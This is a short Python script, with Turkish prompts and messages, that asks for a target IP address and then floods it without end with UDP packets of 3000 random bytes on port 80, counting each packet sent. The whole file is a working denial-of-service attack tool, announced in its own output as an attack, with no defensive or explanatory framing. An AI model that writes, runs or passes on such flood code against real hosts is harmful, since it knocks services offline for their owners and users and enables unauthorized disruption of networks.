import os
import random
import socket

hedef_ip = input("Hedef IP:")
hedef_port =80

bytes=random._urandom(3000)
sock=socket.socket(socket.AF_INET,socket.SOCK_DGRAM)

sayac = 0
while True:
    sock.sendto(bytes,(hedef_ip,hedef_port))
    sayac=sayac+1
    print("saldiri baslatildi , gonderilen pakes : %s"%(sayac))